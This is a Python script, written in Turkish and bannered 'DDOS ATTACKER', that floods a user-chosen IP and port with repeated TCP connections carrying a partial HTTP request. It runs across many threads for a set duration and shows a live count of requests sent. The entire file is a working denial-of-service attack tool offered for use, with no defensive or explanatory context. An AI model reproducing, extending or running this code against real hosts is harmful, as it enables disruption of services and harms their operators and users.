import socket
import ipaddress
import threading
import time
import os

toplam_gonderilen = 0
sayac_kilidi = threading.Lock()
saldiri_devam_ediyor = True

def banner():
    os.system("clear")
    print(r"""
  _____  _____   ____   _____           _______ _______       _____ _  ________ _____  

 |  __ \|  __ \ / __ \ / ____|   /\    |__   __|__   __|/\   / ____| |/ /  ____|  __ \ 
 | |  | | |  | | |  | | (___    /  \      | |     | |  /  \ | |    | ' /| |__  | |__) |
 | |  | | |  | | |  | |\___ \  / /\ \     | |     | | / /\ \| |    |  < |  __| |  _  / 
 | |__| | |__| | |__| |____) |/ ____ \    | |     | |/ ____ \ |____| . \| |____| | \ \ 
 |_____/|_____/ \____/|_____/_/    \_\   |_|     |_/_/    \_\_____|_|\_\______|_|  \_\
                                                               [ Developed By MrV1zo ]
""")

banner()

while True:
    girdi_ip = input("Hedef IP adresi girin: ")
    try:
        dogrulanmis_ip = ipaddress.ip_address(girdi_ip)
        hedef_ip = str(dogrulanmis_ip)
        break
    except ValueError:
        print("HATA: Geçersiz bir IPv4/IPv6 adresi girdiniz! Tekrar deneyin.")

while True:
    try:
        hedef_port = int(input("Hedef PORT'u girin: "))
        if 1 <= hedef_port <= 65535:
            break
        else:
            print("HATA: Port numarası 1 ile 65535 arasında olmalıdır!")
    except ValueError:
        print("HATA: Port sadece sayı olmalıdır!")

thread_sayisi = int(input("Kaç thread (hız) istersiniz?: "))
saldiri_suresi = int(input("Saldırı kaç saniye sürsün?: "))

def saldiri():
    global toplam_gonderilen, saldiri_devam_ediyor
    while saldiri_devam_ediyor:  
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((hedef_ip, hedef_port))
            s.send(b"GET / HTTP/1.1\r\n")
            s.close()
            
            with sayac_kilidi:
                toplam_gonderilen += 1
        except Exception:
            pass  

def gosterge_paneli(baslangic_zamani):
    global saldiri_devam_ediyor
    while saldiri_devam_ediyor:
        gecen_sure = int(time.time() - baslangic_zamani)
        kalan_sure = saldiri_suresi - gecen_sure
        
        if kalan_sure <= 0:
            saldiri_devam_ediyor = False
            break
            
        print(f"\rGönderilen Paket: {toplam_gonderilen} | Kalan Süre: {kalan_sure} saniye", end="")
        time.sleep(0.5)

print("\n Saldırı başlatılıyor...")
time.sleep(1)
baslangic_zamani = time.time()

for i in range(thread_sayisi):
    t = threading.Thread(target=saldiri) 
    t.start()

panel_thread = threading.Thread(target=gosterge_paneli, args=(baslangic_zamani,))
panel_thread.start()

panel_thread.join()

print(f"\n\n ✓ SALDIRI BİTTİ!")
print(f"✓ Toplam gönderilen başarılı paket sayısı: {toplam_gonderilen}")
print(f"✓ Toplam süre: {saldiri_suresi} saniye")
